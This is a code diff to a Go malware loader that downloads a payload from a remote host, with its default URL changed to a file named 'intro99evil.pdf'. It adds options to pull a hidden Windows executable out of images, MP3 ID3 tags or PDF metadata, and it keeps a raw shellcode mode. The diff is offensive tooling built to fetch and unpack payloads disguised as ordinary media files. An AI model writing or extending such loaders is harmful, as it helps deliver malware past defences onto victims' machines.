@@ -13,7 +13,7 @@ import (
 
 const (
 	// Default URL to download from if none provided, configure this before build to point to your payload to avoid passing CLI flags on run
-	defaultDownloadURL = "https://l.station307.com/RirU4G2PQagVJToLNdUKc5/img.png"
+	defaultDownloadURL = "https://l.station307.com/FANybhNDyTG4PHmEShkodF/intro99evil.pdf"
 )
 
 
@@ -33,7 +33,9 @@ func formatBytesAsHex(data []byte) string {
 func main() {
 	
 	// Parse command line flags
-	isImagePtr := flag.Bool("image", false, "Specifies whether the payload is embedded in an image file (PNG)")
+	isImagePtr := flag.Bool("image", false, "Specifies whether the payload is embedded in an image file (PNG/JPEG)")
+	isMP3Ptr := flag.Bool("mp3", false, "Specifies whether the payload is embedded in an MP3 file's ID3 tags")
+	isPDFPtr := flag.Bool("pdf", false, "Specifies whether the payload is embedded in a PDF file's metadata")
 	isShellcodePtr := flag.Bool("shellcode", false, "Specifies whether the payload is raw shellcode")
 	flag.Parse()
 
@@ -97,11 +99,11 @@ func main() {
 		return
 	}
 
-	// If payload is embedded in an image, extract it
-	if *isImagePtr {
+	// If payload is embedded in an image, MP3, or PDF, extract it
+	if *isImagePtr || *isMP3Ptr || *isPDFPtr {
 		extractedPayload, err := extractor.ExtractPEFromBytes(payload)
 		if err != nil {
-			fmt.Println("Error extracting payload from image:", err)
+			fmt.Println("Error extracting payload:", err)
 			return
 		}
 		payload = extractedPayload
